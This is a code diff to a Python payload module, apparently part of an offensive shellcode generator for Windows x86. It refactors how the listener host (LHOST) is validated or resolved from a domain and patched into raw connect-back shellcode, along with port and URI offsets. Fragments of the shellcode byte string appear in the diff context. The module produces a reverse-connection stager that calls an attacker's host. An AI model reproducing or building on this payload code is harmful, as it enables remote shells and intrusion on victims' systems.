@@ -21,7 +21,16 @@ class PayloadModule:
         self.platform = "Windows"
         self.arch = "x86"
         self.lport = int(cli_arguments.port)
-        self.lhost = cli_arguments.ip   # '192.168.63.133\x00' this is encoded('string-escape') and appended to the end
+        # Check if given a domain or IP address:
+        if self.validate_ip(cli_arguments.ip):
+            self.lhost = cli_arguments.ip  # '192.168.63.133\x00' this is encoded('string-escape') and appended to the end
+        else:
+            try:
+                self.lhost = socket.gethostbyname(cli_arguments.ip)
+            except socket.gaierror:
+                print "[*] Error: Invalid domain or IP provided for LHOST value!"
+                print "[*] Error: Please re-run with the correct value."
+                sys.exit(1)
         self.lport_offset = 180  # This is actually going to be little endian
         self.uri_offset = 252
         self.exit_func = '\xf0\xb5\xa2\x56'
@@ -48,22 +57,6 @@ class PayloadModule:
             "\x58\xA4\x53\xE5\xFF\xD5\x93\x53\x53\x89\xE7\x57\x68\x00\x20\x00" +
             "\x00\x53\x56\x68\x12\x96\x89\xE2\xFF\xD5\x85\xC0\x74\xBF\x8B\x07" +
             "\x01\xC3\x85\xC0\x75\xE5\x58\xC3\xE8\x7D\xFF\xFF\xFF")
-
-    def set_attrs(self, lport_value, lhost_value):
-        self.lport = lport_value
-
-        # Check if given a domain or IP address:
-        if self.validate_ip(lhost_value):
-            self.lhost = lhost_value
-        else:
-            try:
-                self.lhost = socket.gethostbyname(lhost_value)
-            except socket.gaierror:
-                print "[*] Error: Invalid domain or IP provided for LHOST value!"
-                print "[*] Error: Please re-run with the correct value."
-                sys.exit()
-
-        return
 
     def gen_shellcode(self):
         # Take the passed in attributes and gen shellcode
